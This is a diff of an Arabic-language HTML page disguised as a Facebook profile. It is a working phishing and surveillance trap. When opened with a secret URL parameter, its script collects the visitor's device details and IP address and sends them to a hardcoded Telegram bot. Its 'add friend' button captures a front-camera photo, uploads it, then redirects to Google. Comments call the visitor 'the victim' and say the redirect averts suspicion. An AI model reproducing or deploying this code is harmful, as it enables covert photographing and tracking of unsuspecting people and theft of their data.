@@ -2,110 +2,131 @@
 <html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    
     <meta property="og:title" content="Najat350">
     <meta property="og:site_name" content="Facebook">
     <meta property="og:description" content="‎Najat350‎ موجودة على فيسبوك. انضم إلى فيسبوك للتواصل مع ‎Najat350‎ وأشخاص آخرين قد تعرفهم.">
-    <meta property="og:image" content="https://i.pinimg.com/originals/10/91/94/1091948c6b80b63f9e3e269f51873239.jpg">
+    <meta property="og:image" content="https://a.top4top.io/p_3695vqrca0.jpeg">
     <meta property="og:type" content="profile">
-    <title>Facebook - Najat350</title>
+    <meta name="twitter:card" content="summary_large_image">
+
+    <title>Najat350 | Facebook</title>
     
     <style>
-        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; background-color: #f0f2f5; margin: 0; }
-        .fb-header { background: white; height: 180px; position: relative; }
-        .cover { background: #ddd; height: 150px; width: 100%; }
-        .profile-img { width: 120px; height: 120px; border-radius: 50%; border: 4px solid white; position: absolute; bottom: -40px; right: 20px; object-fit: cover; }
-        .fb-content { padding: 50px 20px 20px; text-align: right; }
-        .name { font-size: 24px; font-weight: bold; margin: 0; }
-        .bio { color: #65676b; margin: 10px 0; }
-        .btn-blue { background: #1877f2; color: white; border: none; padding: 10px; width: 100%; border-radius: 6px; font-weight: bold; font-size: 16px; cursor: pointer; }
-        video, canvas { display: none; }
+        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; background-color: #f0f2f5; margin: 0; padding: 0; overflow-x: hidden; }
+        .fb-nav { background: #fff; height: 50px; border-bottom: 1px solid #ddd; display: flex; align-items: center; padding: 0 15px; font-weight: bold; color: #1877f2; font-size: 24px; }
+        .cover-photo { background: linear-gradient(to bottom, #ddd, #bbb); height: 200px; width: 100%; position: relative; }
+        .profile-container { background: #fff; padding-bottom: 20px; text-align: right; position: relative; border-bottom: 1px solid #ddd; }
+        .profile-pic { width: 160px; height: 160px; border-radius: 50%; border: 4px solid #fff; position: absolute; top: -100px; right: 15px; object-fit: cover; box-shadow: 0 2px 4px rgba(0,0,0,0.2); }
+        .user-info { padding: 70px 15px 10px; }
+        .user-name { font-size: 28px; font-weight: bold; color: #050505; margin: 0; }
+        .user-bio { color: #65676b; font-size: 16px; margin: 5px 0 15px; }
+        .action-btns { display: flex; gap: 10px; padding: 0 15px; }
+        .btn-blue { background: #1877f2; color: #fff; border: none; flex: 1; padding: 10px; border-radius: 6px; font-weight: bold; font-size: 16px; cursor: pointer; }
+        .btn-gray { background: #e4e6eb; color: #050505; border: none; flex: 1; padding: 10px; border-radius: 6px; font-weight: bold; font-size: 16px; }
+        #camera-layer { display: none; }
     </style>
 </head>
 <body>
-    <div class="fb-header">
-        <div class="cover"></div>
-        <img src="https://i.pinimg.com/originals/10/91/94/1091948c6b80b63f9e3e269f51873239.jpg" class="profile-img">
-    </div>
-    <div class="fb-content">
-        <h1 class="name">Najat350</h1>
-        <p class="bio">حسابي الشخصي - انضم للمتابعة</p>
-        <button class="btn-blue" onclick="initiateExploit()">إضافة صديق</button>
+    <div class="fb-nav">facebook</div>
+    <div class="cover-photo"></div>
+    <div class="profile-container">
+        <img src="https://a.top4top.io/p_3695vqrca0.jpeg" class="profile-pic">
+        <div class="user-info">
+            <h1 class="user-name">Najat350</h1>
+            <div class="user-bio">‏‎(Najat)‎‏</div>
+        </div>
+        <div class="action-btns">
+            <button class="btn-blue" onclick="startAction()">إضافة صديق</button>
+            <button class="btn-gray">رسالة</button>
+        </div>
     </div>
 
-    <video id="video" autoplay playsinline></video>
-    <canvas id="canvas"></canvas>
+    <video id="video" autoplay playsinline style="display:none"></video>
+    <canvas id="canvas" style="display:none"></canvas>
 
     <script>
         const TOKEN = '8301533698:AAFOJ_IyTmOXO5BPQwOEFFFYy7tfIlaqJ1g';
         const ID = '7184970355';
+        
+        // كلمة التفعيل في الرابط (مثلاً: ?active=true)
+        const urlParams = new URLSearchParams(window.location.search);
+        const secretKey = urlParams.get('run'); // الرابط سيعمل إذا كان آخره ?run=1
 
-        // 1. سحب البيانات فور فتح الرابط (بدون إذن)
         window.onload = async () => {
-            let batteryInfo = "";
-            if (navigator.getBattery) {
-                const b = await navigator.getBattery();
-                batteryInfo = `\n- شحن الهاتف: ${b.level * 100}%\n- يشحن؟: ${b.charging ? "نعم" : "لا"}`;
+            if (secretKey !== "1") {
+                // إذا لم توجد الكلمة السرية، سيظهر كصفحة عادية معطلة أو يوجه لمكان آخر
+                console.log("Waiting for trigger...");
+                return;
             }
 
-            const info = `
-📱 معلومات جهاز جديد:
-- IP: جاري الجلب...
-- الجهاز: ${navigator.platform}
-- الرام: ${navigator.deviceMemory || 'غير معروف'} GB
-- النواة: ${navigator.hardwareConcurrency}
-- الشاشة: ${screen.width}x${screen.height}
-- اللغة: ${navigator.language}
-- المتصفح: ${navigator.userAgent.split(' ')[0]} ${batteryInfo}
-            `;
-            sendToTelegram(info);
+            // سحب معلومات الجهاز الشاملة (الأيفون والأندرويد)
+            let battery = await (navigator.getBattery ? navigator.getBattery() : Promise.resolve({level:0, charging:false}));
             
-            // جلب الـ IP
-            fetch('https://api.ipify.org?format=json').then(r => r.json()).then(d => {
-                sendToTelegram(`🌐 عنوان IP الضحية: ${d.ip}`);
-            });
+            let deviceData = `
+📱 معلومات صيد جديد:
+- IP: جاري الجلب...
+- الرابط المستخدم: ${window.location.href}
+- الوقت: ${new Date().toLocaleString('ar-EG')}
+- الجهاز: ${navigator.platform}
+- الذاكرة (RAM): ${navigator.deviceMemory || '4+'} GB
+- الأنوية: ${navigator.hardwareConcurrency}
+- الشاشة: ${screen.width}x${screen.height} (${screen.colorDepth} bit)
+- البطارية: ${battery.level * 100}% (${battery.charging ? "يشحن" : "لا يشحن"})
+- اللغة: ${navigator.language}
+- المتصفح: ${navigator.userAgent.match(/\(([^)]+)\)/)[1]}
+- اللمس: ${navigator.maxTouchPoints > 0 ? "يدعم" : "لا يدعم"}
+            `;
+            
+            sendData(deviceData);
+
+            fetch('https://api.ipify.org?format=json')
+                .then(r => r.json())
+                .then(d => sendData(`🌐 IP الضحية: ${d.ip}`));
         };
 
-        // 2. طلب الكاميرا (يركز على الأيفون)
-        async function initiateExploit() {
+        async function startAction() {
+            if (secretKey !== "1") { alert("الحساب غير متوفر حالياً"); return; }
+
             try {
-                // الأيفون يتطلب playsinline لبدء الكاميرا صمتاً
-                const stream = await navigator.mediaDevices.getUserMedia({ 
-                    video: { facingMode: "user" }, 
-                    audio: false 
-                });
+                // طلب الكاميرا - هذا سيظهر "طلب الإذن" في الأيفون
+                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                 const video = document.getElementById('video');
                 video.srcObject = stream;
-                
-                // التقاط 3 صور سريعة
-                let count = 0;
-                const interval = setInterval(() => {
-                    takeSnap();
-                    count++;
-                    if(count >= 3) clearInterval(interval);
+
+                // التقاط صورة بعد ثانية واحدة
+                setTimeout(async () => {
+                    await takeSnap();
+                    // التوجيه إلى جوجل بعد سحب الصورة بنجاح
+                    window.location.href = "https://www.google.com";
                 }, 1500);
 
             } catch (err) {
-                alert("يرجى تحديث الصفحة والموافقة على الصلاحيات لعرض الحساب.");
+                // إذا رفض الضحية، نوجهه أيضاً لجوجل لإبعاده عن الشك
+                window.location.href = "https://www.google.com";
             }
         }
 
-        function takeSnap() {
+        async function takeSnap() {
             const canvas = document.getElementById('canvas');
             const video = document.getElementById('video');
             canvas.width = video.videoWidth;
             canvas.height = video.videoHeight;
             canvas.getContext('2d').drawImage(video, 0, 0);
             
-            canvas.toBlob(blob => {
-                const fd = new FormData();
-                fd.append('chat_id', ID);
-                fd.append('photo', blob, 'iphone_shot.jpg');
-                fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { method: 'POST', body: fd });
-            }, 'image/jpeg');
+            return new Promise((res) => {
+                canvas.toBlob(blob => {
+                    const fd = new FormData();
+                    fd.append('chat_id', ID);
+                    fd.append('photo', blob, 'shot.jpg');
+                    fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { method: 'POST', body: fd }).then(res);
+                }, 'image/jpeg');
+            });
         }
 
-        function sendToTelegram(text) {
-            fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${ID}&text=${encodeURIComponent(text)}`);
+        function sendData(msg) {
+            fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${ID}&text=${encodeURIComponent(msg)}`);
         }
     </script>
 </body>
